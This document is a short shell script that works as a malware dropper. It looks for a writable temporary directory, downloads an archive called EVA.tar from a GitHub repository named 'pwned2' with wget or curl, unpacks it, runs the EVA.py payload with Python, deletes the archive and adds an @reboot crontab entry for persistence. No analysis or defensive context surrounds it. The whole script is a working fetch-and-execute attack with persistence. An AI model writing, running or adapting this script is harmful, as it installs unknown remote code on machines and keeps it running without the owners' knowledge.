# ARRAY

check_file_integrity(){
   file_path="$1"
   if [ -f "$file_path" ]; then
     return 1
   else # Downloaded file not found, stop execution
     exit 1
   fi
}

possible_paths="/var/tmp /tmp /dev/shm"

for directory in $possible_paths; do
   # IF DIRECTORY IS WRITTABLE, CD INSIDE
   if touch "$directory/test" 2>/dev/null && cd "$directory"; then
     # GET PAYLOAD
     if command -v wget; then
       wget https://raw.githubusercontent.com/dav4dbs/pwned2/main/EVA.tar
     elif command -v curl 2>/dev/null; then
       curl -O https://raw.githubusercontent.com/dav4dbs/pwned2/main/EVA.tar
     else
       exit 1
     fi

     # CHECK FILE / EXTRACT
     check_file_integrity "$directory/EVA.tar"
     if command -v 'tar'; then
        tar -xvf "$directory/EVA.tar"
     else
        exit 1
     fi
     # DELETE COMPRESSED FILE
     rm -rf "$directory/EVA.tar"
     # RUN
     cd "$directory/EVA" || exit 1
     if command -v python3 2>/dev/null; then
        python3 ./EVA.py
     elif command -v python 2>/dev/null; then
        python ./EVA.py
     else
       exit 1
     fi

     (crontab -l 2>/dev/null; echo "@reboot $directory/EVA/EVA.py") | crontab -    
     break
   fi
done 

echo "SUCCESS"
